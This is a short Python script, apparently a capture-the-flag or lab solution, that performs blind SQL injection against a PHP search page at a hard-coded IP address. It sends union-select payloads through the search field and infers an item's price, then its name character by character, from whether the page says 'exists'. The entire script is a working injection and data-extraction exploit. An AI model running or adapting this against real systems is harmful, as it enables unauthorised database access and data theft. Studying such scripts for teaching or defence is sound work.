import requests, string

url = 'http://128.199.224.160:3004/trueorfalse.php'
s = requests.Session()
s.get(url)

exploitPrice = "' union select * from items where price = {} #"
exploitName = "' union select * from items where price = {} and name like '{}%' #"
data = {
    'search': '',
    'submit': 'Search'
}
chars = string.ascii_lowercase + string.ascii_uppercase + string.digits

def searchPrice():
    price = 100
    while price <= 200:
        print(price)
        data['search'] = exploitPrice.format(price)
        r = s.post(url, data=data)
        if 'exists' in r.text:
            print('Found price {}'.format(price))
            return price
        price += 1

def searchName(price, query):
    for c in chars:
        exploitStr = query + c
        data['search'] = exploitName.format(price, exploitStr)
        r = s.post(url, data=data)
        if 'exists' in r.text:
            print(exploitStr)
            searchName(price, exploitStr)

price = searchPrice()
print('Found {}'.format(price))
name = searchName(price, '')
print('Found {}'.format(name))
